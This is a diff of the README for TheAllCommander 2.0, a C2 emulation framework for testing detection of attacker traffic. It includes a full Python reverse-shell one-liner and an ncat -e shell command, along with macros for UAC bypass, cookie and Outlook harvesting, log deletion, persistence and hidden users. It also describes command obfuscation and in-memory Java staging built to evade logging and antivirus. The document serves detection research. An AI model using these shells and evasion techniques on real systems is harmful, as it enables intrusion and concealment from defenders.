@@ -1,11 +1,9 @@
-<img src="https://api.codiga.io/project/35210/status/svg">
-
 # TheAllCommander
 Framework for modeling and researching C2 communications for developing efficient filtering and detection logic.
 
-Featured in DEFCON Demolabs 2022!!!!
+The All Commander 2.0 released January 2024 contains major new features, see [Change Log](Changelog.md)
 
-Planning is currently underway for TheAllCommander 2.0 - please check out the development blog for more information and feel free to open an issue on this site to contribute ideas!
+Featured in DEFCON Demolabs 2022!!!!
 
 Development blog: http://matthandy.net/TAC-development.html
 
@@ -13,7 +11,11 @@ Development blog: http://matthandy.net/TAC-development.html
 TheAllCommander allows researchers to easily develop their own communication modules and connect them to this framework, then leverage the existing framework to test elements of the Red Team workflow through the communication protocol for further study. 
 ## What TheAllCommander is...
 A flexible framework for studying, modeling, and testing new C2 communication protocols.
-A portable framework for executing tests of an environments ability to detect non-nominal C2 traffic.  
+
+A portable framework for executing tests of an environments ability to detect non-nominal C2 traffic.
+
+A robust framework that allows simulation of an attacker's Tools Techniques and Procedures (TTPs) while providing direct mitigation and detection suggestions for augmenting a SIEM.
+   
 ## What TheAllCommander is not...
 TheAllCommander does not natively sling exploits - this is not trying to be Metasploit.
 TheAllCommander does not provide malware agents for use in an engagement - this is not trying to be Cobalt Strike. 
@@ -25,7 +27,7 @@ The central server, TheAllCommander, receives incoming connections on a variety 
 Daemons are uniquely identified by the combination of user account, hostname, and protocol. Therefore multiple daemons can exist on a target system via different protocols, or via different user permission levels. It is also possible to spawn a daemon that identifies itself with a UID, which is specified as a unique identifier consisting of 16 alphanumeric characters. If a UID is specified for the daemon, the server will check to see if there is a prior session for the daemon's combination of hostname, user id, and protocol. If there is such a session, but the other daemon has not been in contact with the server within the configurable expected contact time, then the new daemon will assume the session of the previous one. However, if the other session is still active, then the server will allow both sessions to exist simultaneously. See the HTTPS handler reference implementation for details.
 
 # Defense Recommendations
-TheAllCommander has, new with Release 0.9.4, a basic guide for detection of all client side indicators of compromise enumated by this tool. It can be found here: [Blue Team Guide](blue_team/IOC_Guide.md) 
+TheAllCommander has an evolving guide for detection of as many client side indicators of compromise emulated by this tool as possible. It can be found here: [Blue Team Guide](blue_team/IOC_Guide.md) 
 
 # Interfaces
 Check out the [Developers Guide](DevelopersGuide.md)
@@ -38,14 +40,26 @@ There is also an AbstractCommandMacro class which can accept commands and transl
 
 # Daemons
 Currently, TheAllCommander has been tested with the following payloads:
+
 1) Python. Currently TheAllCommander includes a HTTPS, UDP/DNS, and EMail emulation daemon. These daemons are in no way produced for operations in a real Red Team engagement, and are developed to serve as a template for further comm development. Both demonstrate use of these communication protocols in a comparable way.
 		Note: The email daemon is Windows specific and has not yet been ported to Linux. 
-2) Msfvenom unstaged tcp payloads (windows/x64/shell_reverse_tcp and linux/x86/shell_reverse_tcp)
-3) "Python oneliner" ->  TheAllCommander can receive connections from python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);'
+
+2) Text over tcp reverse shells
+
+	a) Msfvenom unstaged tcp payloads (windows/x64/shell_reverse_tcp and linux/x86/shell_reverse_tcp)
+
+	b) "Python oneliner" ->  TheAllCommander can receive connections from python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);'
 		Note: This has been tested with /bin/sh and the $ will be removed to normalize IO with a Linux ncat shell
-4) ncat <ip> <port> -e cmd | /bin/bash -> works on both Linux and Windows
-5) TheAllCommander has been augmented with the ability to parse C# code and serve it to a C# stager. At present, only a harmless "Hello World" example is provided to demonstrate client-side indicators of compromise. See "C# Staging" below.
-6) The author has developed C++ and C# payloads which are available only for limited release. Until a framework for public release can be developed, they will be held for release on an individually assessed basis.
+
+	c) ncat <ip> <port> -e cmd | /bin/bash -> works on both Linux and Windows
+
+	d) Powershell native text over tcp reverse shells
+
+3) TheAllCommander has been augmented with the ability to parse C# code and serve it to a C# stager. At present, only a harmless "Hello World" example is provided to demonstrate client-side indicators of compromise. See "C# Staging" below.
+
+4) A Java code parser and stager has been added alongside C#. While most active tradecraft for Windows using this sort of staged attack in a self-compiling language is focused on C#, the lack of focus on Java introduces a number of opportunities.
+
+5) C++, C# and Java daemons exist that interoperate with the server framework. However, these are currently invisible to antivirus software, making them useful in live engagements, which is an antigoal of this project. They will be public released outside the collaborative team when a reliable method for flagging them in antivirus is developed so they cannot be misused.   
  
 
 # Commands
@@ -65,9 +79,9 @@ cd (directory) - changes present directory
 
 die - Local daemon closes
 
-screenshot (No Linux support) - Captures a screenshot, and uploads to the HARVEST directory based on hostname\username\time-tagged-file
+screenshot (No Linux/Mac support) - Captures a screenshot, and uploads to the HARVEST directory based on hostname\username\time-tagged-file
 
-clipboard (No Linux support) - captures the clipboard contents and uploads the contents to the HARVEST directory based on hostname-pid-username folder
+clipboard (No Linux/Mac support) - captures the clipboard contents and uploads the contents to the HARVEST directory based on hostname-pid-username folder
 
 cat
  
@@ -102,6 +116,8 @@ harvest_pwd
 	this implementation is rudamentary and uses a simple TCP socket, but will evolve to model more sophisticated attacks for
 	robust detection testing.
 	
+	New with 2.0 - expanded functionality to include text-only channels
+	
 kill_all_harvests
 
 	Terminates all currently open harvest operations
@@ -113,6 +129,21 @@ listActiveHarvests
 kill_harvest <index>
 
 	Supplied with an index from "listActiveHarvests", this command kills a specific directory harvest		
+
+## Command Obfuscation Modes
+
+###Powershell obfuscation
+When this mode is active, commands entered will be treated as literal powershell commands and transmitted in an evasive way to evade trivial logging. "Get-Date" will become "ECHO Get-Date | powershell". This is functionally is equivalent in execution to powershell -c "Get-Date", except it will evade trivial logging. This mode can be enabled with "<ps-start>" and disabled with "<ps-end>"
+
+###Windows command line obfuscation
+Windows command line will ignore "^" characters and execute a command as normal. For example, "n^et user evil_haxor hax123 /add" will add the evil_haxor user, while a SIEM rule looking for commands that include the "net" command literal will be defeated. Note that TheAllCommander will recognize when a user is attempting to run commands like "cd" or server side macros and will not alter these commands. This mode can be engaged as follows:
+
+&lt;esc> -> Prepend any command with "<esc> " to have TheAllCommander insert random ^ characters to demonstrate Windows cmd
+
+&lt;start esc> -> All commands send will include random ^ characters. Does not affect server side macro commands
+
+&lt;end esc> -> Return to normal operations
+ 
 
 ## Shells
 To enable more complicated modeling that involve parallel execution of tasks and to facilitate interaction with command line utilities that require multiple line interactions, TheAllCommander can launch child shells, which can be placed in the background. The following commands are available:
@@ -144,77 +175,100 @@ commands for the daemon. Most of these commands are intended to trigger client s
 The command "list_macros" will list all macros loaded to the server.
 
 spawn_fodhelper_elevated_session
+
 	This macro is designed to enable testing of client-side defenses around the fodhelper user access control defenses. This macro functions by asking the connected daemon for information on how it can be started (IE - an executable name, script path, etc), and will then set the required registry keys for fodhelper to launch a new copy of the daemon. Fodhelper will then be engaged, returning a second session with elevated privileges. At this time, TheAllCommander doesn't support seamless session integration with the elevated session, as this is a red team feature and not needed for indicator of compromise modeling. 
 	Note: Windows defender automatically intercepts the following daemon launch mechanisms: any python script, any command beginning with cmd.exe and any command beginning with powershell.exe. Stand-alone binaries which do not register as malware may be launched, and there is value in doing additional indicator of compromise modeling and heuristic analysis on behavior of these daemons after launch.
 	Future work: Defender will intercept and delete the fodhelper registry key for a python script which is added, however it is slow enough to do so only after the daemon has a chance to launch fodhelper. Some sort of supplemental monitoring to augment defender is necessary for maximum protection, study future mitigation options.
 	
 clean_fodhelper
+
 	This macro is designed to clean up the registry key set by the spawn_fodhelper_elevated_session macro
 
 delete_windows_logs <all | application | security | system | setup>
+
 	This server side macro is used for generating and testing client side indicators of compromise. Malware will often attempt to cleanup by deleting Windows event logs. This macro will cause the connected daemon session to clear the windows event log using the wevtutil utility. It requires elevated privileges to execute. Note: This function actually deletes the targeted Windows logs, so only use on an appropriate test system.
 	Future work: develop more comprehensive indicator of compromise generator by compromising the logs via multiple techniques.
 
 delete_cookies
+
 	deletes cookies for Firefox, Edge (Chromium version), and Chrome on Windows. This is a common tactic for malware, as it forces the end-user to re-enter crediential information. This function will generate an access signature mimicing this attack pattern. NOTE: It does so by actually deleting those files, so use this on a test platform with non-operational users. 
 		
 harvest_cookies
+
 	takes copies of cookies for Firefox, Edge (Chromium) and Chrome on Windows. Takes a copy of Firefox credential files. This should effectively generate a file access signature for validating rules that monitor controls on these sensitive files.
 
 activate_rdp <username>
+
 	sets up Remote Desktop access on windows platforms, only supported by C++ daemons at present (public release pending). This feature was originally implemented using a dropper which would place Chisel on the target system and utilize it for the port tunneling. However, as A/V products are good at finding chisel at the endpoint, this doesn't make for a particularly interesting scenario to model. The implementation has switched to using TheAllCommander's own TCP tunneling, which should emulate a much more instructive threat model. 
 
 startSocks5 <port>
+
 	This command starts a SOCKS5 proxy on TheAllCommander which receives connect requests on the specified port. As new connections come in, the connected daemon will forward those incoming connections. This allows for tunneled network traffic, similar to the equivalent Meterpreter functionality.
 
 empty_recycle_bin
+
 	This command deletes the recycle bin contents for the user with the current session to generate a client side indicator of compromise.
 
 harvest_user_dir
+
 	This command initiates an automatic harvest of Windows Desktop and Documents directories and Linux home directories, depending on the host
 	
 harvest_outlook (basic | deep)
+
 	This command with the "basic" argument will harvest the default .pst and .ost files used by Outlook. In "deep" mode, the tool will search for a non-standard .pst location and harvest it.
 
 regkey_persist (lm | cu) (calc - optional)
+
 	This command will use either the local machine (lm) or current user (cu) startup registry key to start the daemon process on next startup. To simulate an attempt to write to these keys without invoking the daemon on startup, the optional third argument "calc" can be used to configure the system to launch calc.exe on startup. This provides more flexibility in environments where the actual test daemon cannot be given actual persistence to stay within the test boundaries.
 
 reg_debugger <process name>
-	This command will use the Windows Local Machine registry key for process debugging to launch the daemon process instead whenever the target process is executed. This is not a stealthy technique, but attackers sometimes use it and it deserves robust detection. Requires and elevated session.
+
+	This command will use the Windows Local Machine registry key for process debugging to launch the daemon process instead whenever the target process is executed. This is not a stealthy technique, but attackers sometimes use it and it deserves robust detection. Requires an elevated session.
 
 reg_silent_exit <process name>
+
 	This command will use the Windows SilentProcessExit registry key to launch the daemon process when the target process is closed. This is a reasonably stealthy technique if the attacker uses it skillfully in terms of user awareness. Requires an elevated session.
 
 add_hidden_user <optional - username> <optional - password>
+
 	This command, with no arguments, will generate a random user string and password, with the final character being '$' and creates the account via the Win32 API and with the UF_WORKSTATION_TRUST_ACCOUNT flag. This makes the user account unseen by "net user", so it is more stealthy and the baseline user creation techniques. If invoked with one argument, it will use the argument as the password. The user can also specify a username without the trailing '$'. TheAllCommander will honor that username, however it will post a warning. This feature is inspired by https://github.com/Ben0xA/DoUCMe  
 	
 ### Enumeration
 
 enum_av
+
 	This command uses WMIC to enumerate AV products on Windows
 	
 enum_network_share
+
 	This command uses WMIC to enumerate network shares on Windows
 	
 enum_patches <wmic | ps>
+
 	This command uses WMIC or Powershell to enumerate patch level on Windows	
 
 enumerate_users
-	This command will enumerate the users present on the system and the domain. If domain access is present, groups are enumerated as well. Current, this command will only work on Windows daemons
+
+	This command will enumerate the users present on the system and the domain. If domain access is present, groups are enumerated as well.
 
 	
 # Near Term Project Goals
+
 DNSEmulatorSubdomainComms currently implements traffic hiding within DNS using the tried and true technique of hiding base64 communication in the subdomain, such as <secret message>.domain.com, with responses returned in DNS TXT records. In the future, I will be implementing a novel protocol which is less obvious to provide modelling for less trivial heuristic detection.  
 
 The project currently supports a very basic set of IOC detection recommendations. My goal is to augment this suite to provide robust detection of more IOCs, as well as more recommendations for protection of common data assets.
 
 # Default Commands
+
 Sometimes it is desirable for daemons to automatically execute commands without human interaction on connecting for the first time with the home server. The configuration file element "hub.cmd.defaults" can be used to specify a file that contains commands to be sent automatically. There are several tags, and an example is included the "test" directory. This functionality is controlled with the configuration flag:
 hub.cmd.defaults=test\\default_commands
 
 The tags within the default commands file are as follows. The tag proceeds commands which will be executed.
+
 :all -> Applies to all daemons connecting
+
 :user-<username> -> Applies to all users matching this username. For example, all Administrator sessions might wish to execute higher level persistence establishment
+
 :hostname-<hostname> -> Applies to all daemons on a host. Useful if there is some steps necessary to enable commanding on a particular
 
 # Configuration
@@ -285,10 +339,19 @@ To configure the header file within the csharp_payload directory, please use the
 
 To change the default served payload, please use the parameter "daemon.payload.csharp.filelist=HelloWorld.cs"  
 
-From the text client for TheAllCommander, please select the "WIZARD" option when prompted on startup. The commands to create either a text stager or a pre-compiled stager will be printed there in a help menu.
+From the text client for TheAllCommander, please select the "WIZARD" option when prompted on startup. The commands to create either a text stager or a pre-compiled stager will be printed there in a help menu. Dynamic obfuscation of the file is available, please follow the Wizard prompts to enable.
 	Note: The stager is only compiled for the user by TheAllCommander server if the server is run on Windows.
 	
 The C# stager by default is generated with random code permutations. To disable this, please see the WIZARD help options for syntax.
+
+# Java Staging
+Java code can compile and run other Java code at runtime, and can be used by malicious actors with the same purpose as C#. While the concept is similar to C#, the executions is different. In the case of C#, the client loads a complete code base and then loads compiles it. However, with Java the local code loads a remote jar into memory, and then executes the code in memory. As with C#, the code is never written to disk and therefore is more likely to evade antivirus.
+
+First, the user will generate a jar file containing a program with a main method, as with a normal Java program. This jar file is then hosted from a web server at a location the target client can reach.
+
+Second, client code which will download the jar and execute that code is generated by TheAllCommander. From the command line wizard, use the command "generate_java". The first argument is the name of the Main class of the previous Java jar file. The second through "n" arguments are a list of jar files to be loaded. For example, "generate_java localhost:8010 HelloWorld HelloWorld.jar Other.jar".
+
+Finally, TheAllCommander will download an executable jar file that can be executed on the client to run the payload jar. There is a "HelloWorld" jar file included under "agents/HelloWorld/java"
 
 # Dependencies
 Java JDK
@@ -297,6 +360,7 @@ Maven
 
 Python 3.10 or greater -> ensure that both the Python and scripts directory are on your path (%APPDATA%\Local\Programs\Python\Python310 and %APPDATA%\Local\Programs\Python\Python310\Scripts by default)
 
+Note: Python 3.11 or great is required for Mac support.
 
 ## Python Daemon Dependencies
 pip install keyboard
@@ -311,9 +375,9 @@ pip install pycryptodome
 
 
 # Building & Running
-TheAllCommander server is tested to build and work on both Windows and Linux. The python daemons are developed primarily to demonstrate indicators of compromise on Windows hosts, and as such the keylogger and clipboard capture functionality does not work on Linux. However, the daemon will load and run, managing imports on an operating system dependent basis. 
+TheAllCommander server is tested to build and work on both Windows, Linux, and Mac. The python daemons are developed primarily to demonstrate indicators of compromise on Windows hosts, and as such the keylogger and clipboard capture functionality does not work on Linux. However, the daemon will load and run, managing imports on an operating system dependent basis. 
 
-1) There should be a keystore.jks file (by default nomenclature, changeable in test.properties) in the config directory. To generate one, use the following command to leverage the Java keytool program: keytool -genkey -alias server-alias -keyalg RSA -keypass password -storepass password -keystore keystore.jks
+1) There should be a keystore.jks file (by default nomenclature, changeable in test.properties for Windows and test_linux.properties for Linux and Mac) in the config directory. To generate one, use the following command to leverage the Java keytool program: keytool -genkey -alias server-alias -keyalg RSA -keypass password -storepass password -keystore keystore.jks
 
 NOTE: Mvn test will run tests of the HTTPS server, so there must be a keystore file to ensure that certificates can load before all build tests will pass
 
@@ -352,7 +416,7 @@ Note: There is a default_commands file under "test" which contains the load scri
 NOTE: Automated testing of the outlook harvester macro is disabled by default, and can be activated by setting outlookharvest.live.enable=true in the the test_config.properties file. This is disabled by default since some users are building and testing on production laptops with actual Outlook data, and therefore we want users to opt in to that test. The test starts a local daemon and a local TheAllCommander instance, and ensures that Outlook data is correctly processed by the local instance.
 
 #Code Quality
-Code quality is checked by Codiga : https://app.codiga.io/hub/project/35210/TheAllCommander
+TBD
 
 #Contributing
 Looking to contribute? There are a few work items in the queue that would be great help with!
